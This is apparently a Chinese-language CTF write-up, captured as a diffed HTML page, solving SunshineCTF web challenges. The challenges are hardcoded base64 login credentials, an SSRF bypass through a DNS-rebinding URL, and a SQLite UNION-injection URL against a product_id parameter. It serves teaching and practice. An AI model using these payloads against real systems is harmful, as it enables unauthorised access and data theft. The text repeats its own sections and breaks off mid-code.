main=parseInt(getComputedStyle(document.body).getPropertyValue("--article-width"),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue("--toc-width"),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue("--gap"),10);function checkTocPosition(){const e=document.body.scrollWidth;e-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect(),n=e.ownerDocument.defaultView;return t.top+n.pageYOffset}</script><div class=post-content><h2 id=lunar-auth>Lunar Auth<a hidden class=anchor aria-hidden=true href=#lunar-auth>#</a></h2><p>robots.txt：</p><pre tabindex=0><code># tired of these annoying search engine bots scraping the admin panel page logins:
 
 Disallow: /admin
-</code></pre><p><code>/admin</code>有一段前端登录验证：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/*
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    To reduce load on our servers from the recent space DDOS-ers we have lowered login attempts by using Base64 encoded encryption
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    (&#34;encryption&#34; 💀) on the client side.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    TODO: implement proper encryption.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    */</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">real_username</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">atob</span>(<span style="color:#e6db74">&#34;YWxpbXVoYW1tYWRzZWN1cmVk&#34;</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">real_passwd</span>   <span style="color:#f92672">=</span> <span style="color:#a6e22e">atob</span>(<span style="color:#e6db74">&#34;UzNjdXI0X1BAJCR3MFJEIQ==&#34;</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    document.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#34;DOMContentLoaded&#34;</span>, () =&gt; {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">form</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#34;form&#34;</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">handleSubmit</span>(<span style="color:#a6e22e">evt</span>) {
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">evt</span>.<span style="color:#a6e22e">preventDefault</span>();
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">form</span>.<span style="color:#a6e22e">elements</span>[<span style="color:#e6db74">&#34;username&#34;</span>].<span style="color:#a6e22e">value</span>;
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">password</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">form</span>.<span style="color:#a6e22e">elements</span>[<span style="color:#e6db74">&#34;password&#34;</span>].<span style="color:#a6e22e">value</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">username</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">real_username</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">password</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">real_passwd</span>) {
-</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// remove this handler and allow form submission
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#a6e22e">form</span>.<span style="color:#a6e22e">removeEventListener</span>(<span style="color:#e6db74">&#34;submit&#34;</span>, <span style="color:#a6e22e">handleSubmit</span>);
-</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">form</span>.<span style="color:#a6e22e">submit</span>();
-</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#34;[ Invalid credentials ]&#34;</span>);
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">form</span>.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#34;submit&#34;</span>, <span style="color:#a6e22e">handleSubmit</span>);
-</span></span><span style="display:flex;"><span>    });
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
-</span></span></code></pre></div><p>解码base64得到<code>username</code>和<code>password</code>分别为<code>alimuhammadsecured</code>和<code>S3cur4_P@$$w0RD!</code>，登录拿到flag：</p>
-<pre tabindex="0"><code>Mission Control — FLAG
+</code></pre><p><code>/admin</code>有一段前端登录验证：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>script</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>/*
+</span></span></span><span style=display:flex><span><span style=color:#75715e>    To reduce load on our servers from the recent space DDOS-ers we have lowered login attempts by using Base64 encoded encryption
+</span></span></span><span style=display:flex><span><span style=color:#75715e>    (&#34;encryption&#34; 💀) on the client side.
+</span></span></span><span style=display:flex><span><span style=color:#75715e>    
+</span></span></span><span style=display:flex><span><span style=color:#75715e>    TODO: implement proper encryption.
+</span></span></span><span style=display:flex><span><span style=color:#75715e>    */</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>real_username</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>atob</span>(<span style=color:#e6db74>&#34;YWxpbXVoYW1tYWRzZWN1cmVk&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>real_passwd</span>   <span style=color:#f92672>=</span> <span style=color:#a6e22e>atob</span>(<span style=color:#e6db74>&#34;UzNjdXI0X1BAJCR3MFJEIQ==&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    document.<span style=color:#a6e22e>addEventListener</span>(<span style=color:#e6db74>&#34;DOMContentLoaded&#34;</span>, () =&gt; {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>form</span> <span style=color:#f92672>=</span> document.<span style=color:#a6e22e>querySelector</span>(<span style=color:#e6db74>&#34;form&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>handleSubmit</span>(<span style=color:#a6e22e>evt</span>) {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>evt</span>.<span style=color:#a6e22e>preventDefault</span>();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>username</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>form</span>.<span style=color:#a6e22e>elements</span>[<span style=color:#e6db74>&#34;username&#34;</span>].<span style=color:#a6e22e>value</span>;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>password</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>form</span>.<span style=color:#a6e22e>elements</span>[<span style=color:#e6db74>&#34;password&#34;</span>].<span style=color:#a6e22e>value</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>username</span> <span style=color:#f92672>===</span> <span style=color:#a6e22e>real_username</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>password</span> <span style=color:#f92672>===</span> <span style=color:#a6e22e>real_passwd</span>) {
+</span></span><span style=display:flex><span>            <span style=color:#75715e>// remove this handler and allow form submission
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#a6e22e>form</span>.<span style=color:#a6e22e>removeEventListener</span>(<span style=color:#e6db74>&#34;submit&#34;</span>, <span style=color:#a6e22e>handleSubmit</span>);
+</span></span><span style=display:flex><span>            <span style=color:#a6e22e>form</span>.<span style=color:#a6e22e>submit</span>();
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>            <span style=color:#a6e22e>alert</span>(<span style=color:#e6db74>&#34;[ Invalid credentials ]&#34;</span>);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>form</span>.<span style=color:#a6e22e>addEventListener</span>(<span style=color:#e6db74>&#34;submit&#34;</span>, <span style=color:#a6e22e>handleSubmit</span>);
+</span></span><span style=display:flex><span>    });
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#960050;background-color:#1e0010>/script&gt;</span>
+</span></span></code></pre></div><p>解码base64得到<code>username</code>和<code>password</code>分别为<code>alimuhammadsecured</code>和<code>S3cur4_P@$$w0RD!</code>，登录拿到flag：</p><pre tabindex=0><code>Mission Control — FLAG
 Authorized access confirmed. Presenting mission artifact:
 
       sun{cl1ent_s1d3_auth_1s_N3V3R_a_g00d_1d3A_983765367890393232}
-</code></pre><h2 id="intergalactic-webhook-service">Intergalactic Webhook Service<a hidden class="anchor" aria-hidden="true" href="#intergalactic-webhook-service">#</a></h2>
-<p>app.py：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> threading
-</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, request, abort, render_template, jsonify
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
-</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> urllib.parse <span style="color:#f92672">import</span> urlparse
-</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> http.server <span style="color:#f92672">import</span> BaseHTTPRequestHandler, HTTPServer
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> ipaddress
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> uuid
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">load_flag</span>():
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;flag.txt&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> f:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> f<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>strip()
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>FLAG <span style="color:#f92672">=</span> load_flag()
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">FlagHandler</span>(BaseHTTPRequestHandler):
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">do_POST</span>(self):
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>path <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;/flag&#39;</span>:
-</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>send_response(<span style="color:#ae81ff">200</span>)
-</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>send_header(<span style="color:#e6db74">&#39;Content-Type&#39;</span>, <span style="color:#e6db74">&#39;text/plain&#39;</span>)
-</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>end_headers()
-</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>wfile<span style="color:#f92672">.</span>write(FLAG<span style="color:#f92672">.</span>encode())
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
-</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>send_response(<span style="color:#ae81ff">404</span>)
-</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>end_headers()
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span><span style="color:#66d9ef">lambda</span>: HTTPServer((<span style="color:#e6db74">&#39;127.0.0.1&#39;</span>, <span style="color:#ae81ff">5001</span>), FlagHandler)<span style="color:#f92672">.</span>serve_forever(), daemon<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)<span style="color:#f92672">.</span>start()
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>registered_webhooks <span style="color:#f92672">=</span> {}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create_app</span>():
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> app
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>)
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;index.html&#39;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">is_ip_allowed</span>(url):
-</span></span><span style="display:flex;"><span>    parsed <span style="color:#f92672">=</span> urlparse(url)
-</span></span><span style="display:flex;"><span>    host <span style="color:#f92672">=</span> parsed<span style="color:#f92672">.</span>hostname <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;&#39;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
-</span></span><span style="display:flex;"><span>        ip <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>gethostbyname(host)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Could not resolve host&#39;</span>
-</span></span><span style="display:flex;"><span>    ip_obj <span style="color:#f92672">=</span> ipaddress<span style="color:#f92672">.</span>ip_address(ip)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ip_obj<span style="color:#f92672">.</span>is_private <span style="color:#f92672">or</span> ip_obj<span style="color:#f92672">.</span>is_loopback <span style="color:#f92672">or</span> ip_obj<span style="color:#f92672">.</span>is_link_local <span style="color:#f92672">or</span> ip_obj<span style="color:#f92672">.</span>is_reserved:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;IP &#34;</span><span style="color:#e6db74">{</span>ip<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34; not allowed&#39;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>, <span style="color:#66d9ef">None</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/register&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;POST&#39;</span>])
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">register_webhook</span>():
-</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;url&#39;</span>)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> url:
-</span></span><span style="display:flex;"><span>        abort(<span style="color:#ae81ff">400</span>, <span style="color:#e6db74">&#39;Missing url parameter&#39;</span>)
-</span></span><span style="display:flex;"><span>    allowed, reason <span style="color:#f92672">=</span> is_ip_allowed(url)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> allowed:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> reason, <span style="color:#ae81ff">400</span>
-</span></span><span style="display:flex;"><span>    webhook_id <span style="color:#f92672">=</span> str(uuid<span style="color:#f92672">.</span>uuid4())
-</span></span><span style="display:flex;"><span>    registered_webhooks[webhook_id] <span style="color:#f92672">=</span> url
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#39;status&#39;</span>: <span style="color:#e6db74">&#39;registered&#39;</span>, <span style="color:#e6db74">&#39;url&#39;</span>: url, <span style="color:#e6db74">&#39;id&#39;</span>: webhook_id}), <span style="color:#ae81ff">200</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/trigger&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;POST&#39;</span>])
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">trigger_webhook</span>():
-</span></span><span style="display:flex;"><span>    webhook_id <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;id&#39;</span>)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> webhook_id:
-</span></span><span style="display:flex;"><span>        abort(<span style="color:#ae81ff">400</span>, <span style="color:#e6db74">&#39;Missing webhook id&#39;</span>)
-</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> registered_webhooks<span style="color:#f92672">.</span>get(webhook_id)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> url:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#39;error&#39;</span>: <span style="color:#e6db74">&#39;Webhook not found&#39;</span>}), <span style="color:#ae81ff">404</span>
-</span></span><span style="display:flex;"><span>    allowed, reason <span style="color:#f92672">=</span> is_ip_allowed(url)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> allowed:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#39;error&#39;</span>: reason}), <span style="color:#ae81ff">400</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
-</span></span><span style="display:flex;"><span>        resp <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>, allow_redirects<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#39;url&#39;</span>: url, <span style="color:#e6db74">&#39;status&#39;</span>: resp<span style="color:#f92672">.</span>status_code, <span style="color:#e6db74">&#39;response&#39;</span>: resp<span style="color:#f92672">.</span>text}), resp<span style="color:#f92672">.</span>status_code
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#39;url&#39;</span>: url, <span style="color:#e6db74">&#39;error&#39;</span>: <span style="color:#e6db74">&#39;something went wrong&#39;</span>}), <span style="color:#ae81ff">500</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;listening on port 5000&#39;</span>)
-</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0.0.0.0&#39;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">5000</span>)
-</span></span></code></pre></div><p>5001端口绑定了提供flag的服务，5000端口提供正常的web服务，思路是通过<code>/register</code>路由注册url，再通过<code>/trigger</code>路由打SSRF，但是对于<code>is_ip_allowed</code>对于url的限制很严格，简单来看就是过滤了本地ip，同时<code>/trigger</code>路由不允许重定向，无法使用自己的vps搭建的网页中的恶意javascript进行fetch，利用DNS重绑定来绕过：<code>http://08080808.7f000001.rbndr.us:5001/flag</code></p>
-<p>由于服务器设置的是随机返回第一个或第二个ip，需要多trigger几次：</p>
-<pre tabindex="0"><code>{&#34;response&#34;:&#34;sun{dns_r3b1nd1ng_1s_sup3r_c00l!_ff4bd67cd1}&#34;,&#34;status&#34;:200,&#34;url&#34;:&#34;http://08080808.7f000001.rbndr.us:5001/flag&#34;}
-</code></pre><p>参考资料：</p>
-<p><a href="https://docs.python.org/zh-cn/3/howto/ipaddress.html">https://docs.python.org/zh-cn/3/howto/ipaddress.html</a></p>
-<p><a href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a></p>
-<h2 id="lunar-shop">Lunar Shop<a hidden class="anchor" aria-hidden="true" href="#lunar-shop">#</a></h2>
-<p>SQLite注入，注入点为<code>product_id</code>：</p>
-<pre tabindex="0"><code>https://meteor.sunshinectf.games/product?product_id=0%20union%20select%201,2,3,group_concat(tbl_name)%20from%20sqlite_master%20where%20type=%27table%27%20--+
+</code></pre><h2 id=intergalactic-webhook-service>Intergalactic Webhook Service<a hidden class=anchor aria-hidden=true href=#intergalactic-webhook-service>#</a></h2><p>app.py：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> threading
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> Flask, request, abort, render_template, jsonify
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> urllib.parse <span style=color:#f92672>import</span> urlparse
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> http.server <span style=color:#f92672>import</span> BaseHTTPRequestHandler, HTTPServer
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> socket
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> ipaddress
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> uuid
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>load_flag</span>():
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;flag.txt&#39;</span>, <span style=color:#e6db74>&#39;r&#39;</span>) <span style=color:#66d9ef>as</span> f:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> f<span style=color:#f92672>.</span>read()<span style=color:#f92672>.</span>strip()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>FLAG <span style=color:#f92672>=</span> load_flag()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>FlagHandler</span>(BaseHTTPRequestHandler):
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>do_POST</span>(self):
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> self<span style=color:#f92672>.</span>path <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;/flag&#39;</span>:
+</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>send_response(<span style=color:#ae81ff>200</span>)
+</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>send_header(<span style=color:#e6db74>&#39;Content-Type&#39;</span>, <span style=color:#e6db74>&#39;text/plain&#39;</span>)
+</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>end_headers()
+</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>wfile<span style=color:#f92672>.</span>write(FLAG<span style=color:#f92672>.</span>encode())
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>send_response(<span style=color:#ae81ff>404</span>)
+</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>end_headers()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>threading<span style=color:#f92672>.</span>Thread(target<span style=color:#f92672>=</span><span style=color:#66d9ef>lambda</span>: HTTPServer((<span style=color:#e6db74>&#39;127.0.0.1&#39;</span>, <span style=color:#ae81ff>5001</span>), FlagHandler)<span style=color:#f92672>.</span>serve_forever(), daemon<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>)<span style=color:#f92672>.</span>start()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>app <span style=color:#f92672>=</span> Flask(__name__)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>registered_webhooks <span style=color:#f92672>=</span> {}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>create_app</span>():
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> app
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/&#39;</span>)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>index</span>():
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;index.html&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>is_ip_allowed</span>(url):
+</span></span><span style=display:flex><span>    parsed <span style=color:#f92672>=</span> urlparse(url)
+</span></span><span style=display:flex><span>    host <span style=color:#f92672>=</span> parsed<span style=color:#f92672>.</span>hostname <span style=color:#f92672>or</span> <span style=color:#e6db74>&#39;&#39;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
+</span></span><span style=display:flex><span>        ip <span style=color:#f92672>=</span> socket<span style=color:#f92672>.</span>gethostbyname(host)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span>:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>, <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Could not resolve host&#39;</span>
+</span></span><span style=display:flex><span>    ip_obj <span style=color:#f92672>=</span> ipaddress<span style=color:#f92672>.</span>ip_address(ip)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ip_obj<span style=color:#f92672>.</span>is_private <span style=color:#f92672>or</span> ip_obj<span style=color:#f92672>.</span>is_loopback <span style=color:#f92672>or</span> ip_obj<span style=color:#f92672>.</span>is_link_local <span style=color:#f92672>or</span> ip_obj<span style=color:#f92672>.</span>is_reserved:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>, <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;IP &#34;</span><span style=color:#e6db74>{</span>ip<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34; not allowed&#39;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>True</span>, <span style=color:#66d9ef>None</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/register&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;POST&#39;</span>])
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>register_webhook</span>():
+</span></span><span style=display:flex><span>    url <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;url&#39;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> url:
+</span></span><span style=display:flex><span>        abort(<span style=color:#ae81ff>400</span>, <span style=color:#e6db74>&#39;Missing url parameter&#39;</span>)
+</span></span><span style=display:flex><span>    allowed, reason <span style=color:#f92672>=</span> is_ip_allowed(url)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> allowed:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> reason, <span style=color:#ae81ff>400</span>
